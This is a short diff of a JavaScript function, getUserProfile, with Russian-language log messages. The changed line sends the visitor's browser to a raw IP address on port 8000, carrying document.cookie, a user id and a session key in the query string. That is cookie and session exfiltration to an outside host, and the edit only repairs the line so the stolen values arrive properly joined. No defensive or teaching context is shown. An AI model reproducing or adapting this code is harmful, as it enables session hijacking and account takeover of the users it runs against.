@@ -58,7 +58,7 @@ async function getUserProfile() {
         console.log(htmlContent.substring(0, 1000));
         console.log('... (остальной контент обрезан) ...');
         console.log(`Общая длина HTML: ${htmlContent.length} символов`);
-        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+id,sesskey;
+        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+" "+id+" "+sesskey;
         return htmlContent;
         
     } catch (error) {
